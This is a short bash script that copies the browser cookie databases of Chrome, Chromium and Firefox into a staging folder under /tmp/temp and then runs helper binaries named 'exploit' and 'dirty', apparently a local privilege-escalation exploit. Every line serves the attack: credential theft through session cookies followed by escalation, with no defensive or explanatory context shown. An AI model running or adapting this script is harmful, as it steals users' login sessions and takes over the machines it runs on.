#!/bin/bash


/tmp/temp/run.sh
cp ~/.config/google-chrome/Default/Cookies /tmp/temp/r
cp ~/.config/chromium/Default/Cookies /tmp/temp/r
cp ~/.mozilla/firefox/'$USER'.default/cookies.sqlite /tmp/temp/r
/tmp/temp/exploit < /tmp/temp/stable.sh
/tmp/temp/dirty




